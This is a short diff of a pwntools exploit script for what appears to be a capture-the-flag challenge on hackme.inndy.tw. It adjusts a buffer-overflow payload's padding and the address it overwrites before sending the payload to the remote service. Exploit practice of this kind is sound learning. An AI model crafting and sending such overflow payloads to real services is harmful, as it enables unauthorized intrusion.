@@ -10,7 +10,7 @@ c = remote('hackme.inndy.tw', 7717)
 context.os='linux'
 context.arch='amd64'
 
-payload = p32(0x0) + 'a' * (0xffffd630 - 0xffffd57c) +p32(0x1) + p32(0x804a060)
+payload = p32(0x0) + 'a' * (0xffffd634 - 0xffffd57c) + p32(0x804a060)
 
 print(c.recvline())
 c.send(payload)
